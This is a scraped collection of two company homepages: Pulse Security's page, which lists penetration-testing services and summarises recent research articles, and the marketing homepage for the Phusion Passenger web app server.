[Privacy Policy & Disclaimer](https://www.phusion.nl/privacy) | [Trademark Notice](https://www.phusion.nl/trademarks)
Copyright ©  Phusion® B.V. All rights reserved.



=== Content from pulsesecurity.co.nz_be58ed8c_20250126_090124.html ===


# [Pulse Security Logo](/index.html)

* [Home](/)
* [Our Team](/team)
* [Our Services](/services/penetration-testing)
  + [Penetration Testing](/services/penetration-testing)
  + [Adaptive Defence Review](/services/adaptive-defence-review)
  + [Incident Response](/services/incident-response)
  + [Consultancy](/services/consultancy)
* [Releases](/releases)
* [Careers](/careers)
* [Contact Us](#contact-us)

## Pulse Security Logo

**Pulse Security** is a specialist information security consultancy.

We're here to help your business stay protected from adversaries.

* [Learn More](#services)

* ### Offensive Security

  We specialise in finding vulnerabilities and ensuring your systems are operating safely.
  Find your vulnerabilities before your adversaries.
* ### Collaboration and Engineering

  Our focus is a collaborative and research-based approach to truly understand your vulnerabilities.
* ### First-Class Research

  We're focused on offensive security, and
  our internal research program is dedicated to
  advancing the state-of-the-art.
* ### Quality First

  All engagements follow our comprehensive technical
  methodologies and quality assurance process.

### [Penetration Testing](/services/penetration-testing.html)

Our specialist offensive testing services include an extensive
range of penetration testing capabilities at the application,
network, and physical level.

* Security Research as a Service
* Red Teaming and Attacker Emulation
* Web Application and API
* External, Internal, and Wireless Networks
* Host and SOE
* Cloud Environments
* Mobile Applications
* Bespoke Systems and Applications

### [Security Review](/services/consultancy.html)

Complementing our Penetration Testing we also perform network
architecture and application review services. Helping your
business achieve best practice design and secure-by-default
approaches to your infrastructure.

* Network Architecture Review
* Application Architecture Review
* Source Code Review
* DevOps Review
* General Security Consultancy

### [Incident Response](/services/incident-response.html)

For when things go wrong, our experienced and qualified team will help
with getting you back on track.

* Incident Response Preparedness
* Incident Management and Leadership
* Forensic Investigations (GIAC Certified Forensic Analysts)
* Malware Analysis

## Featured Releases

[Article](/articles)

### [Tales From The Crypt: Microsoft Unicode Collation Oddities Leading to Software Vulnerabilities](/articles/mssql-unicode-collation-bugs)

by Denis Andzakovic
• Nov 29 2024

A goblin emoji and an empty string are the same thing, according to Microsoft SQL Server. The issue here is that almost every application language tends to disagree. This can lead to one of my favourite kinds of security issue ever – a whacky processing logic inconsistency between two systems leading to a vulnerability. The bickering-couple of AppSec. This is an article about one such condition, which causes a potential issue for any application using MSSQL as a back-end database. Let’s dive in!

---

[Article](/articles)

### [Noot - Encrypted resumable ICMP exfiltration](/articles/noot-icmp-exfil)

by Rob Armstrong
• Aug 4 2024

Noot: a pair of PowerShell scripts for transferring files using ICMP (ping). Complete with encryption, partial transfer resume, and big (1GB+) file support.

---

[Article](/articles)

### [A hex editor and nothing to lose - Binary patching Golang to fix net/http](/articles/golang-patching)

by Denis Andzakovic
• Jul 23 2024

This article is going to look at patching Golang code at the assembly level to modify some behaviour in the `net/http` standard library. The Golang maintainers aren’t super interested in changing this bit of behavior, so lets fix it ourselves!

## Get in touch

How can we help?

+64 4 889 4756

info at pulsesecurity.co.nz

### Contact Us

Email us: info at pulsesecurity.co.nz

+64 4 889 4756 (Wellington)

+64 9 889 6871 (Auckland)

###

Pulse Security

PO Box 610

Wellington 6140

New Zealand

© Pulse Security Ltd. All rights reserved.



=== Content from www.phusionpassenger.com_344d16b3_20250126_090125.html ===


[* ![](/assets/octo2017/header/passenger_logo-f5c64f31da6ae3df69518326df90bea42572c6583d299fafd96be1d468e17ccd.svg)](/)* [Home](/)
* [Features](/features)
* [Pricing](/pricing)
* [Docs](https://www.phusionpassenger.com/docs/)
* [Support](/support)
* [Blog](https://blog.phusion.nl)
* [Sign in](/customers)
* [Install 6.0 now](/install)

# Developers, take a load off

Passenger® is an app server that runs and automanages your web apps with ease. Also improves security, reliability and scalability. [Learn more](/features).

[get started](/install)
play video

![](/assets/octo2017/index/justin_detached-69f50ee72dc8ee27de21b3f0ba0f040932afaa17010252b4921974aabee6cc31.png)

![](/assets/octo2017/index/passenger6-51559cd645be3af736eb6bd97bdb5752daa14b7510015697b8487247365c3931.png)
# Passenger 6 has arrived

Passenger 6 introduces standardization across your stack by supporting all languages.

[Upgrade](https://www.phusionpassenger.com/docs/advanced_guides/install_and_upgrade/standalone/upgrade.html)
[Read more](/passenger6)

### Over 650,000 sites use Passenger

From business critical apps with billions of requests per day to small side projects, Passenger is tailored for each scenario.

[xml version="1.0" encoding="UTF-8"?

Intercom
Created with Sketch.](https://www.intercom.com)
[xml version="1.0" encoding="UTF-8"?

Pivotal
Created with Sketch.](https://pivotal.io)
[xml version="1.0" encoding="UTF-8"?

Apple
Created with Sketch.](https://www.apple.com)
[xml version="1.0" encoding="UTF-8"?

Hitachi
Created with Sketch.](http://www.hitachi.com)
[xml version="1.0" encoding="UTF-8"?

Salesforce
Created with Sketch.](https://www.salesforce.com)
[xml version="1.0" encoding="UTF-8"?

Pixar
Created with Sketch.](https://www.pixar.com)

## Supercharge Your Web App

Passenger has a myriad of features that are invaluable to today’s web apps and microservice APIs. You get these benefits (and more) by simply installing Passenger with Nginx or Apache. [Learn how](/features).

### Optimization

Passenger was built with high performance and efficiency in mind. With Passenger’s zero-copy architecture, turbocaching and support for multiple concurrency models, you can count on Passenger to get the most out of your hardware.

### Stability

Passenger auto-manages your apps’ processes, restarting them and itself if they ever crash. Passenger also keeps resource hogging apps in check, giving your web app maximum uptime.

### Documentation

A tool is only as good as its users are able to wield it. Passenger comes with world class documentation to allow you to fully leverage its features.

### Security

Passenger protects your web apps from various malicious attacks like slow client attacks, common HTTP parser exploits and privilege escalations.

### Reliability

Passenger was battle-tested with some of the most demanding web apps for over a decade. This makes it one of the toughest app servers to date, currently powering over 650,000 web apps.

### Polyglot

Deploy all your apps from one Passenger instance in seconds, regardless of the language they’re written in. No need to fiddle around with multiple app servers and proxies anymore!

## You too can deploy apps with confidence

Learn what else Passenger can do for you.

[Continue tour](/features)

> As a consultant, I'm less likely to have anything to fix with Passenger, compared to other Ruby deploys. So many botched setups in the wild.
>
>
> [Thibaut Barrère @thibaut\_barrere](https://twitter.com/thibaut_barrere/status/875352909617213440)

> One of the 100s of reasons why I love [@phusion\_nl](https://twitter.com/phusion_nl) [#SuperSecure](https://twitter.com/hashtag/SuperSecure?src=hash) [#SuperFast](https://twitter.com/hashtag/SuperFast?src=hash) [#SuperStable](https://twitter.com/hashtag/SuperStable?src=hash)
>
>
> [Matthew Barnard @MatthewSBarnard](https://twitter.com/MatthewSBarnard/status/756128258509398016)

> Thank you [@phusion\_nl](https://twitter.com/phusion_nl) for an awesome solution and outstanding documentation! [#passenger](https://twitter.com/hashtag/passenger?src=hash)
>
>
> [Jason Bornhoft‏ @jmvbxx](https://twitter.com/jmvbxx/status/727629221569376256)

> Man, [@phusion\_nl](https://twitter.com/phusion_nl)'s README for their amazing docker image is some of the best documentation. Thanks!
>
>
> [Stephen‏ @arewenotmen](https://twitter.com/arewenotmen/status/847187977830912000)

## Stay in the event loop

Get news and tips on our products and/or programming in general.
No more than 1 email per week. Pinky swear.

## Get started with Passenger!

See the advantages for yourself in under 10 minutes, or contact us with your questions.

[Let's do this!](/install)
[Learn more](/features)

... or [Contact Us](/contact) for help.

[![](/assets/octo2017/footer/passenger-469ddedda4d17e7277eb2b4d38d912aba7399c711031aac99349fa5662f304fc.svg)](/)

### Passenger

* [Home](/)
* [Features](/features)
* [Enterprise](/features#premium-features)
* [Pricing](/pricing)
* [Support](/support)
* [Customer Area](/customers)

### Resources

* [Installation](https://www.phusionpassenger.com/docs/advanced_guides/install_and_upgrade/standalone/install/)
* [User docs](https://www.phusionpassenger.com/docs)
* [FAQ](/support#faq)
* [Blog](https://blog.phusion.nl)

### Contact

* [General](/contact)
* [Sales](/contact)
* [Support](/contact)
* [Security](/contact)

[Twitter](https://twitter.com/phusion_nl)
[Github](https://github.com/phusion)
[Phusion](https://www.phusion.nl)

[Privacy Policy & Disclaimer](https://www.phusion.nl/privacy) | [Trademark Notice](https://www.phusion.nl/trademarks)
Copyright © 2025 Phusion B.V. All rights reserved.


